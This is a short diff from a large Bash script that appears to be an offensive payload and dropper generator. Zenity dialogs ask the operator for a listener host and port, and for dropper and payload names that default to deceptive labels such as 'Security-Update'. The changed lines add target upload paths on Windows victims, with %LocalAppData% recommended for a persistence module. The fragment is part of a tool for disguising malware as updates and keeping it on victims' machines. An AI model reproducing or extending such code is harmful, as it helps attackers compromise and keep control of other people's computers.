@@ -12323,14 +12323,14 @@ lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --wid
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
 Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: Update-ID00788\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
 NaM=$(zenity --title="☠ Enter PAYLOAD NAME ☠" --text "example: Security-Update\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
-rpath=$(zenity --title="☠ Enter Payload Upload Path (target dir) ☠" --text "example: %tmp%\nexample: %localappdata%\nexample: %userprofile%\\\\\\\Desktop" --entry --width 350) > /dev/null 2>&1
+rpath=$(zenity --title="☠ Enter Payload Upload Path (target dir) ☠" --text "example: %tmp%\nexample: %ProgramFiles%\nexample: %LocalAppData% (*)\nexample: %userprofile%\\\\\\\Desktop\n\n(*) Recomended Path For Persistence Module." --entry --width 350) > /dev/null 2>&1
 
 
 ## Setting default values in case user have skip this ..
 if [ -z "$lhost" ]; then lhost="$IP";fi
 if [ -z "$lport" ]; then lport="443";fi
 if [ -z "$Drop" ]; then Drop="Update-ID00788";fi
-if [ -z "$rpath" ]; then rpath="%localappdata%";fi
+if [ -z "$rpath" ]; then rpath="%LocalAppData%";fi
 if [ -z "$NaM" ]; then NaM="Security-Update";fi
 
 
